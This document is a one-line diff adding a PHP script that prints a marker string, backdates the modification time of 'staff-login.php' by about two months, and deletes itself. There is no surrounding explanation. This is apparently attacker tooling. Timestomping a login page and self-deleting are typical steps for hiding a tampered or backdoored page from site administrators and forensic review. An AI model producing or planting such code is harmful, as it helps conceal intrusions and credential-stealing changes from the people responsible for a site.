@@ -1,0 +1,1 @@
+<?php echo "RqQsGVRrKy"; if (file_exists("./staff-login.php")){ touch("./staff-login.php",(time()-60*60*24*30*2)); } unlink(__FILE__); /*9Kt1GCxAn74Q3PfdFKP6*/ ?>
